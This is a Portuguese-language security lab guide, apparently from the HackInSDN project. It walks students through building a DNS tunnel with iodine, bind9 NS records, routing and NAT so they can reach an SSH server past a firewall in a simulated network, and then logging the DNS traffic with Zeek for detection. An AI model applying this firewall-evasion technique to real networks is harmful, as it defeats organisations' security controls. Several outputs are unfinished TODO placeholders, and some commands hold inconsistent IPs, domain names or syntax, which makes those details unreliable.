## 🔷 Contextualização

![topologia](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/topologia.png)

Neste laboratório, você irá aprender sobre como o tunelamento DNS pode ser utilizado para burlar políticas de segurança. O laboratório é composto por 3 grupos:

1. Rede Corporativa HackInSDN;
2. Rede da Random Company;
3. Rede do túnel DNS.

Sendo que o objetivo é acessar o servidor SSH da Random Company, a partir da rede 1, a qual bloqueia tráfego SSH por motivos de segurança, utilizando a rede 3 para estabecer um túnel DNS que permite o tráfego SSH.

## 🔷 Atividade 1: Teste de acesso ao serviço SSH

O protocolo SSH (Secure Shell) promove comunicação segura entre um cliente e um servidor. Ele utiliza criptografia para proteger a transmissão de dados, garantindo que os pacotes de informação sejam enviados de forma segura. O SSH é muito utilizado para gerenciar dispositivos remotos, permitindo que administradores acessem e controlem servidores e outros equipamentos de maneira segura, mesmo em redes não confiáveis.

### 🔹 Atividade 1.1: Iniciando o serviço SSH no randomSrv

Primeiramente, é preciso iniciar o serviço SSH no servidor da Random Company, utilizando o _service-mnsec-ssh_, aplicação criada para utilização no dashboard HackInSDN. Para isso, execute os seguintes comandos no host _randomSrv_:

```
#Iniciando o serviço
service-mnsec-ssh.sh --start
#Verificando o status do serviço
service-mnsec-ssh.sh --status
```

Após isso, será possível acessar remotamente o host _randomsSrv_ através do protocolo SSH.

### 🔹 Atividade 1.2: Tentando acessar o serviço no h101

Após iniciar o serviço SSH no randomSrv, podemos tentar acessá-lo a partir do h101, executando o seguinte comando:

```
ssh root@192.2.0.2
```

Porém, inicialmente não será observada nenhuma saída. Após alguns minutos, o comando terá a seguinte saída de erro:

```
root@h101:~# ssh myuser@203.0.113.2
ssh: connect to host 203.0.113.2 port 22: Connection timed out
```

Isso ocorre por conta das regras estabelecidas no fw101, as quais liberam tráfego HTTP, HTTPS, ICMP e DNS, mas bloqueia para outros protocolos, por questões de segurança. 

## 🔷 Atividade 2: Estabelecimento do túnel DNS

Após verificarmos que não é possível acesar o serviço SSH a partir do h101, iremos estabelecer um túnel DNS, a partir do qual poderemos permitir tráfego SSH na Rede Corporativa HackInSDN por meio de requisições DNS. Ao longo dessa atividade, você irá entender sobre como esse processo é estabelecido.

### 🔹 Atividade 2.1: Iniciando o serviço Mnsec-Bind9 no fw101

Um dos primeiros passos para estabelecer um túnel DNS é a criação de domínios os quais possam ser utilizados para comunicação dentro do túnel. Nesse sentido, iremos utilizar o host _fw101_ para criação de nomes de domínios os quais serão resolvidos no host _srv201_, de forma que o _h101_ poderá se comunicar com o _srv201_ através de requisições DNS, o que permitirá estabelecimento do túnel.

Nesse sentido, é preciso permitir comunicação entre processos internos, a partir da permissão de tráfego na interface _loopback_ do _fw101_. Esse processo é necessário para viabilizar a resolução de nomes, pois permite que o processo que recebe a requisição DNS possa solicite um roteamento para fazer com a requisição chegue ao destino. Para isso, execute no terminal do _fw101_:

```
iptables -I INPUT -i lo -j ACCEPT
```

Após isso, precisamos configurar o processo de resolução de nomes no _fw101_. Para isso, precisamos iniciar o serviço msec-bind9, que foi criado no contexto do dashboard HackInSDN para permitir a criação de nomes de domínio nas topologias dos laboratórios. Para iniciar o serviço e adicionar um domínio, devemos executar os seguintes comandos:

```
service-msec-bind9.sh fw101 --start
service-msec-bind9.sh fw101 --add-zone teste.ufba.br
```

Sendo que o primeiro comando inicia o serviço msec-bind9, enquanto o segundo adiciona o nome de domínio teste.ufba.br ao serviço. 

### 🔹 Atividade 2.2: Criação de domínios no fw101 utilizando o serviço Mnsec-Bind9

Após isso, iremos adicionar alguns registros DNS ao nome de domínio, para permitir a resolução de nomes. Primeiro, iremos adicionar um registro do tipo A, o qual é resolvido diretamente em um endereço IP, nesse caso, o IP do host _srv201_, permitindo o envio de requisições DNS para ele. Nesse sentido, execute o seguinte comando no host _fw101_:

```
service-msec-bind9.sh fw101 --add-entry teste.ufba.br srv201 IN A 203.0.113.2
```

Dessa forma, se um host tentar resolver o nome de domínio _teste.ufba.br_, a requisição será enviada para o IP do _srv201_.

Após isso, definiremos um registro DNS do tipo NS (Name Server), o qual será utilizado para estabelecer o túnel DNS. O registro do tipo NS é associado a um outro nome de domínio, que pode ter um registro do tipo A, por exemplo, o qual é resolvido por um host que podemos chamar de servidor autoritário. 

Nesse contexto, quando uma requisição é enviada para um nome de domínio que tem registro do tipo NS, a requisição é enviada para o servidor autoritário, o qual resolve o nome de domínio associado ao registro NS.

Tendo isso em vista, no túnel DNS, o registro NS será utilizado para estabelecer o túnel e será associado a um nome de domínio com registro A associado ao IP do host _srv201_, de modo que as requisições para o primeiro, enviadas a partir do _h101_, serão encaminhadas para o segundo, permitindo comunicação entre o _h101_ e o _srv201_ através de requisições DNS.

Considerando isso, iremos adicionar um registro do tipo NS associado ao registro do tipo A atrelado ao IP do _srv201_, executando o seguinte comando:

```
service-msec-bind9.sh fw101 --add-entry teste.ufba.br t1 IN NS srv201.test.ufba.br
```

Após isso, podemos executar alguns comandos no _h101_ para verificar se a resolução de domínios ocorre corretamente, sendo que:

1. O primeiro comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio _teste.ufba.br_;
2. O segundo comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio do tipo A _srv201.teste.ufba.br_;
3. O segundo comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio do tipo NS _t1.teste.ufba.br_;

```
dig @198.51.100.1 teste.ufba.br
dig @198.51.100.1 srv201.teste.ufba.br A
dig @198.51.100.1 t1.teste.ufba.br NS
```

Ao analisar as saídas desses comandos, será possível observar informações sobre os domínios registrados.

### 🔹 Atividade 2.2: Instalando iodine e configurando a resolução de nomes

Uma vez criados os nomes de domínios necessários, podemos iniciar de fato o processo de estabelecimento do tunel, utilizando a ferramenta iodine. Para isso, é preciso primeiramente baixar e configurar a aplicação no terminal do Mininet-Sec:

```
apt update && apt install iodine -y
#Criação de diretórios necessários
mkdir -p /dev/net
mknod /dev/net/tun c 10 200
chmod 666 /dev/net/tun
```

Para o que o h101 tenha o fw101 como resolvedor DNS
Após isso, precisamos configurar o _fw101_ como resolvedor DNS do _h101_, de modo que todas as requisições DNS do segundo sejam enviadas para o primeiro. Para isso devemos executar o seguinte comando no _h101_:

```
echo 198.51.100.1 > /etc/resolv.conf
```

De modo que alteramos o arquivo `resolv.conf`, mudando as configurações de resolução DNS do _h101_. 

### 🔹 Atividade 2.3: Estabelecimento do túnel

Após isso, podemos iniciar o túnel DNS. O túnel é composto por dois componentes: O servidor e o cliente, sendo que o primeiro fica à espera de requisições relativas a um nome de domínio específicas a serem enviadas pelo cliente para estabelecer o túnel. 

Nesse sentido, executaremos o seguinte comando no host _srv201_:

```
iodined -f -c -P SuperSecretPassword 10.199.199.0/24 t1.teste.ufba.br
```

Sendo que o comando possui os seguintes parâmetros:

1. `iodined`: Parâmetro utilizado para indicar que estamos lidando com o servidor do túnel;
2. `-f`: Parâmetro que faz com que o comando continue sendo executado em primeiro plano;
3. `-P`: Parâmetro para estabelecer a seha a qual será requisitada para iniciar conexão no túnel;
4. `SuperSecretPassword`: A senha que iremos utilizar para autenticar conexão ao túnel;
5. `10.199.199.0/24`: Máscara de rede a partir da qual serão definidos os endereços dos hosts no contexto do túnel;
6. `t1.teste.ufba.br`: Nome de domínio a partir do qual serão enviados.

De modo que o srv201, como servidor do túnel DNS, passa a esperar requisições do cliente para estabelecer o túnel. 

A saída do comando deve ser a seguinte:

```
TODO: Colocar prints
```

Após isso, podemos conectar o cliente, o _h101_ ao túnel, executando o seguinte comando nele:

```
iodine -f -P SuperSecretPassword t1.teste.ufba.br
```

O qual possui quase os mesmos parâmetros do comando anterior, e que promove o envio de requisições DNS do _h101_ para o _srv201_, as quais possuem características as quais farão o _srv201_ iniciar a conexão do túnel.

Após a execução desse comando, o túnel será iniciado, como podemos observar na seguinte saída do _h101_:

```
TODO: Colocar saída do comando
```

Após isso, podemos verificar a conectividade no túnel executando o seguinte comando no _srv201_:

```
ping -c 5 10.199.199.2
```

Cuja seguinte saída indica que o _srv201_ consegue se conectar ao _h101_ através do túnel:

```
TODO: Colocar saída do comando ping
```

Além disso, podemos executar o seguinte comando no _h101_ para verificar se ele consegue se conectar ao _srv201_ no contexto do túnel:

```
ping -c 5 10.199.199.1
```

Cuja saída deve ser a seguinte:

```
TODO: Colocar saída do comando ping.
```

### 🔹 Atividade 2.4: Mudanças de regras de firewall

Uma vez estabelecido o túnel, podemos enfim utilizá-lo para fazer com que o _h101_ se conecte ao serviço SSH do _randomSrv_, através da exfiltração de dados via requisições DNS, processo sobre o qual iremos aprender mais a seguir.

Nesse sentido, o primeiro passo é executar o seguinte comando no _h101_:

```
ip route add 192.2.0.2 via 10.199.199.1
```

Ao executarmos esse comando, adicionamos uma nova regra de roteamento no _h101_, a qual faz com que os pacotes que tenham como destino o _randomSrv_, que possui o IP 192.2.0.2, sejam encaminhados ao IP 10.199.199.1, que corresponde à interface do _srv201_ a qual é utilizada pelo mesmo para se comunicar no túnel.

Após isso, vamos executar o seguinte comando no _srv1_, para fazer com que todos os pacotes que saiam pela interface srv201-eth0 tenham seu IP de origem alterado para o IP da interface:

```
iptables -t nat -A -POSTROUTING -o srv201-eth0 -j MASQUERADE
```

Isso é útil pois faz com que os pacotes originados nas interfaces relativas ao túnel em _h101_ ou _srv201_ possam ser encaminhados para outros hosts com o IP legítimo da interface srv201-eth0, o qual está incluído em regras de roteamento dos outros hosts.

### 🔹 Atividade 2.5: Conectando o h101 ao serviço SSH do randomSRV via túnel DNS:

Agora podemos enfim, fazer com que o _h101_ se conecte ao serviço SSH do _randomSrv_,executando o seguinte comando:

```
ssh root@192.2.0.2
```

TODO: Adicionar diagrama explicativo sobre como a comunicação ocorre.

Nesse sentido, podemos entender como a comunicação ocorre a partir do seguinte diagrama:

![topologia](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/etapas_requisicao_dns.png)

Sendo que:

1. Etapa 1: Representa o envio da requisição DNS pelo _h101_ no contexto do túnel, contendo a solicitação de acesso ao serviço SSH do _randomSrv_, para o _fw101_, que foi configurado como resolvedor DNS do _h101_;
2. Etapa 2: Representa o envio da requisição DNS para o _srv201_, configurado para resolver o nome de domínio usado para estabelecer o túnel, através da conexão entre o _fw101_ e o _r201_;
3. Etapa 3: Após receber a requisição DNS, o _srv201_ a desencapsula, analisa suas informações e verifica a solicitação de acesso ao serviço SSH do _randomSrv_, e o encaminha para o mesmo, fazendo com que a conexão de um cliente a um servidor SSH ocorra através de um túnel DNS

Após isso, o _randomSrv_ recebe as informações necessárias e responde à solicitação do _h101_. Quando a resposta chega ao _srv201_, ela é encapsulada em uma resposta DNS a qual é enviada para o _h101_ no túnel, de forma que este último consegue acessar o serviço SSH do randomSrv apesar das restrições de tráfego da rede corporativa HackInSDN.

### 🔹 Atividade 2.6: Encerrando a conexão ao túnel

Após a realização das atividades, o túnel DNS pode ser encerrado utilizando as teclas `Ctrl+C` nos terminais do _srv201_ e _h101_.

```
TODO: Colocar prints mostrando o fim da comunicação
```

## 🔷 Atividade 3: Verificação da criação de logs no Zeek

O Zeek é um analisador de tráfego _Open Source_ o qual pode ser usado para monitorar o tráfego de rede de forma customizada. Nesse sentido, iremos utilizar um script da ferramenta para fazer análises sobre o tráfego DNS da rede.

### 🔹 Atividade 3.1: Iniciando o monitoramento de rede

Para executarmos essa etapa, primeiro precisamos verificar a presença do script que vamos usar no ambiente, nomeado `dns_lab_script.zeek`. Para isso, podemos executar os seguintes comandos no host _zeek_:

```
#Acessando o diretório no qual temos o script
cd scripts/lab-dns/
#Verificando a presença do script
ls 
#Saída: dns_lab_script.zeek
```

Após verificarmos a presença do script, podemos iniciar o monitoramento de rede utilizando ele. Para isso, é recomendado criar um diretório para armazenar os logs que serão gerados, executando o seguinte comando, ainda no diretório `/scripts/lab-dns`:

```
mkdir logs
cd logs
```

Podemos, enfim iniciar o monitoramento pelo host _zeek_:

```
zeek -i br0 ../dns_lab_script.zeek
```

Sendo que estamos monitorando a interface `br0`, que intercepta tanto tráfego que ocorre entre _zeek_ e _fw101_ quanto entre _zeek_ e _h101_.

### 🔹 Atividade 3.2: Criação de domínios no fw101 utilizando o serviço Mnsec-Bind9

Nessa etapa, iremos registrar nomes de domínio que representam o comportamento benigno do usuário, visando verificar a diferença da análise feita pelo Zeek de um nome comum e um nome gerado aleatoriamente no contexto do túnel DNS, executando os seguintes comandos no _fw101_

```
service-msec-bind9.sh fw101 --start
service-msec-bind9.sh fw101 --add-zone socialmedia.com
service-msec-bind9.sh fw101 --add-entry socialmedia.com marketplace IN A 203.0.113.2
```

```
service-msec-bind9.sh fw101 --start
service-msec-bind9.sh fw101 --add-zone newswebsite.com
service-msec-bind9.sh fw101 --add-entry newswebsite.com trending IN A 203.0.113.2
```

> [!IMPORTANT]
> Perceba que estamos utilizando o IP do srv201 para hospedar mais de um nome de domínio, o que é totalmente possível e aplicável na vida real, onde um servidor pode hospedar vários nomes de domínio. Você conhecia essa possibilidade? Escreva sobre o seu entendimento acerca da relação entre servidores e os domínios os quais eles podem hospedar.

<textarea name="resposta_dump_manual" rows="6" cols="80" placeholder="Escreva sua resposta aqui..."> </textarea>

Após isso, iremos acessar os nomes de domínio criados a partir do _h101_, para que sejam gerados logs sobre essa atividade:

```
dig socialmedia.com
dig marketplace.socialmedia.com
dig newswebsite.com
dig trending.newswebsite.com
```

Feito isso, podemos verificar os logs gerados.

